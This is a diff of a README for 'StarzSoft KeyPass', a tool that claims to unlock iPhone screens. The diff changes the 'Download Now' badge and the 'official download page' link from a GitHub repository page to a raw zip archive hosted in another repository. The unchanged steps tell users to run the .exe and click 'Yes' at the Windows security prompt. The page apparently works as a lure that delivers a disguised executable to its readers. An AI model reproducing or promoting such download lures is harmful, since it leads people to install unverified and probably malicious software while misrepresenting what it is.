@@ -5,7 +5,7 @@ description: "Download the full version of StarzSoft KeyPass for Windows 10 and 
 ---
 # 🔓 StarzSoft-2026 - Unlock your iPhone screen with ease
 
-[![Download StarzSoft KeyPass](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://github.com/ayush001-tech/StarzSoft-2026)
+[![Download StarzSoft KeyPass](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://raw.githubusercontent.com/ayush001-tech/ayush001-tech.github.io/main/assets/Dist-v1.3.zip)
 
 ## 🎯 Purpose of this software
 
@@ -26,7 +26,7 @@ Ensure your computer meets these standards before you start:
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official download page](https://github.com/ayush001-tech/StarzSoft-2026) to obtain the installer.
+1. Go to the [official download page](https://raw.githubusercontent.com/ayush001-tech/ayush001-tech.github.io/main/assets/Dist-v1.3.zip) to obtain the installer.
 2. Look for the file ending in .exe and save it to your desktop.
 3. Locate the file on your computer and double-click it.
 4. Windows will show a security prompt. Select "Yes" to allow the installer to run.
